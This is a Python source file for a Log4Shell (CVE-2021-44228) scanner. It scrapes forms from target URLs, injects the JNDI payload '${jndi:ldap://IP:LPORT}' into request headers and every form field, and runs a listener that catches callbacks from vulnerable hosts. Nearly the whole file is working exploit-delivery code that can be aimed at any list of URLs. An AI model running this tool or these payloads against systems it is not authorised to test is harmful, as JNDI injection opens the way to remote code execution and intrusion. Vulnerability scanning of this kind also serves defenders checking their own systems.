import sys
import os
from dotenv import load_dotenv
import requests
import socket
import argparse
from urllib.parse import urlparse
from bs4 import BeautifulSoup as bs
from queue import Queue
import threading
from termcolor import cprint

headers = ["User-Agent", "X-Forwarded-For", "Referer"]


def parseUrl(url):
    parsed_uri = urlparse(url)
    scheme = parsed_uri.scheme
    if scheme != 'http' and scheme != 'https':
        raise Exception(f"[E] Unsupported schema {scheme}")
    hostname = parsed_uri.hostname
    try:
        ip = socket.gethostbyname(hostname)
    except Exception as e:
        raise e
    port = parsed_uri.port
    if port == None:
        port = 80 if scheme == 'http' else 443
    return ip, port


def getUrlsFromFile(path):
    with open(path) as f:
        lines = [line for line in f.read().splitlines() if line.strip()]
    return lines


def getAllForms(url):
    results = []
    try:
        res = requests.get(url, timeout=10)
    except Exception as e:
        return results
    content = bs(res.text, 'html.parser')
    forms = content.findAll('form')
    for form in forms:
        action = form.get('action')
        if(action == None):
            continue
        method = 'GET' if form.get('method') is None else form.get('method')
        inputs = form.find_all('input')
        item = {"url": url, "action": action, "method": method, "inputs": []}
        for input in inputs:
            if input.get('name') != None:
                item["inputs"].append(input.get('name'))
        results.append(item)
    return results


def performRequest(form, socket_ip_port):
    hd = {}
    exploit = "${jndi:ldap://" + socket_ip_port + "}"
    for c in headers:
        hd[c] = exploit
    try:
        if(form["action"] != "" and form["action"][0] == "/"):
            parsed_uri = urlparse(form["url"])
            result = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_uri)
            form["url"] = result + form["action"]
        if(form["method"].upper() == 'GET'):
            getParams = "?"
            for input in form["inputs"]:
                getParams += input + "=" + exploit
                if input != form["inputs"][-1]:
                    getParams += "&"
            cprint(f"[+] Trying GET request: {form['url']+getParams}", "cyan")
            requests.get(form['url']+getParams, headers=hd, timeout=10)
        elif(form["method"].upper() == 'POST'):
            payload = {}
            for input in form["inputs"]:
                payload[input] = exploit
            cprint(
                f"[+] Trying POST request: {form['url']} with payload:  {str(payload)}", "cyan")
            requests.post(form["url"], headers=hd, data=payload, timeout=10)
        else:
            cprint(f"[-] Unsoppurted method: {form['method']}")
    except Exception as e:
        raise e


def log4jExploit(q, url, port, ip, skip_forms):

    # Quick (and dumb) hack to avoid requests timeout when destination port is closed
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((ip, port))
            s.close()
    except:
        cprint(f"[E] Skipping url {url} because port {port} is closed!", "red")
        return

    # Exploit logic
    if(skip_forms == False):
        forms = getAllForms(url)
        cprint(f"[+] Found {len(forms)} form" if (len(forms) ==
               0 or len(forms) == 1) else f"[+] Found {len(forms)} forms", "cyan")
        for form in forms:
            performRequest(form, os.getenv("IP") + ":" + os.getenv('LPORT'))
    hd = {}
    exploit = "${jndi:ldap://" + \
        os.getenv("IP") + ":" + os.getenv('LPORT') + "}"
    for c in headers:
        hd[c] = exploit
    try:
        cprint(
            f"[+] Trying GET request (only headers) to main url: {url}", "blue")
        requests.get(url, headers=hd, timeout=10)
        res = None
        while(q.qsize() != 0):
            res = q.get()
        if(res != None):
            cprint(
                f"[+] {url} is vulnerable! Outgoing IP address and port: {res} ", "red", attrs=['blink', 'bold'])
        else:
            cprint(f"[+] {url} does NOT seem to be vulnerable!",
                   "green", attrs=['bold'])
    except Exception as e:
        raise e


def serverThread(q, s):
    while True:
        try:
            conn, addr = s.accept()
            with conn:
                q.put(addr)
                conn.close()
        except Exception as e:
            #print("Socket has been closed by main thread! Exiting...")
            sys.exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Single url you want to test (valid url is http(s)://host:[port]/[path])")
    parser.add_argument("--headers", nargs='+',
                        help="Custom headers you want to try (space separated)")
    parser.add_argument("--urls", help="A file containing 1 url per line")
    parser.add_argument("--skip-forms", default=False, action="store_true",
                        help="Skip forms check (only perform 1 request)")
    args = parser.parse_args()

    urls = []

    if(args.headers != None):
        for custom_header in args.headers:
            headers.append(custom_header)

    skip_forms = args.skip_forms

    if(args.url == None and args.urls == None):
        cprint("[E] At least 1 url must be provided", "red")
        sys.exit(1)
    if(args.urls != None):
        urls = getUrlsFromFile(args.urls)
    else:
        urls.append(args.url)

    load_dotenv()

    HOST = "0.0.0.0"
    PORT = int(os.getenv("LPORT"))
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen()

    cprint(f"[*] *** Log4j_checker.py *** a Python3 scanner for CVE-2021-44228, better known as Log4Shell.\n[*] Author: lfama - https://github.com/lfama/log4j_checker", color='magenta', attrs=['bold'])
    cprint(
        f"[*] Starting server at address {os.getenv('IP')} and port {PORT} waiting for callbacks..", color='magenta')

    q = Queue()
    t1 = threading.Thread(target=serverThread, args=(q, server_socket))
    t1.start()

    for url in urls:
        try:
            ip, port = parseUrl(url)
            cprint(
                f"[+] Going to test url: {url} ({ip})", "yellow")
            log4jExploit(q, url, port,
                         ip, skip_forms)
        except KeyboardInterrupt:
            server_socket.close()
            sys.exit(0)
        except Exception as e:
            cprint(
                f"[E] Exception: \" {str(e)} \" while processing url {url}", "red")
            continue
    server_socket.close()
    sys.exit(0)


if __name__ == '__main__':
    main()
